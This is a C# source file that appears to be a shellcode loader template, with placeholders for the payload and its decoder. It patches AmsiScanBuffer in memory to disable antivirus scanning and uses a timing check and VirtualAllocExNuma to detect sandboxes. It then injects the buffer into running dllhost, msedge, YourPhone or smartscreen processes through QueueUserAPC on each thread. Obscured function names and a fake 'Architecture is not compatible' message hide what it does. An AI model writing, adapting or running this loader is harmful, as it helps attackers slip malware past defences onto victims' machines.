using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;

namespace apcqueue
{
    internal class Program
    {
        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200),
            THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
            THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        static void cleaning()
        {
            // all credits to https://rastamouse.me/memory-patching-amsi-bypass/
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName == "amsi.dll")
                {
                    hAmsi = module.BaseAddress;
                    Console.WriteLine("Found isma");
                    break;
                }
            }
            if (hAmsi == IntPtr.Zero)
            {
                return;
            }
            else
            {
                var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
                var garbage = Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

                VirtualProtect(asb, (UIntPtr)garbage.Length, 0x40, out uint oldProtect);

                Marshal.Copy(garbage, 0, asb, garbage.Length);

                VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);

                Console.WriteLine("Patched");
            }
        }

        static void enhance(byte[] buf, Process process)
        {
            // thanks to https://github.com/pwndizzle/c-sharp-memory-injection/blob/master/apc-injection-new-process.cs
            // https://dev.to/wireless90/stealthy-code-injection-in-a-running-net-process-i5c

            Console.WriteLine("Targeting {0}", process.Id);

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, (uint)process.Id);
            IntPtr resultPtr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, MEM_COMMIT, PAGE_READWRITE);
            IntPtr bytesWritten = IntPtr.Zero;
            bool resultBool = WriteProcessMemory(hProcess, resultPtr, buf, buf.Length, out bytesWritten);
            foreach (ProcessThread thread in process.Threads)
            {
                Console.WriteLine("Found thread {0}", (uint)thread.Id);
                IntPtr threadHandle = OpenThread(ThreadAccess.THREAD_HIJACK, false, (uint)thread.Id);
                VirtualProtectEx(hProcess, resultPtr, (UIntPtr)buf.Length, PAGE_EXECUTE_READ, out _);
                QueueUserAPC(resultPtr, threadHandle, IntPtr.Zero);
            }
        }

        static Process[] boxboxbox(string host)
        {

            var processes = Process.GetProcessesByName(host);
            
            return processes;
        }

        static bool buy_in()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return false;
            }

            return true;
        }

        static void Main(string[] args)
        {
            string[] hosts = {"dllhost", "msedge", "YourPhone", "smartscreen"};

            !!!_SHELLCODE_MARK!!!
            
            bool result = buy_in();

            if (!result)
            {
                Console.WriteLine("Architecture is not compatible");
                System.Environment.Exit(1);
            }
            cleaning();

            List<Process> res = new List<Process>();
            foreach (string host in hosts)
            {
                var processes = boxboxbox(host);
                if (processes.Length != 0)
                {
                    foreach (Process process in processes){
                        res.Add(process);
                    }
                }
            }

            if (res.Count == 0)
            {
                Console.WriteLine("Found no process");
                System.Environment.Exit(1);
            }
            else
            {

                !!!DECODE_ROUTINE!!!

                foreach (var process in res)
                {
                    Console.WriteLine("Found process {0}", process.Id);
                    enhance(buf, process);
                }
            }
        }
    }
}
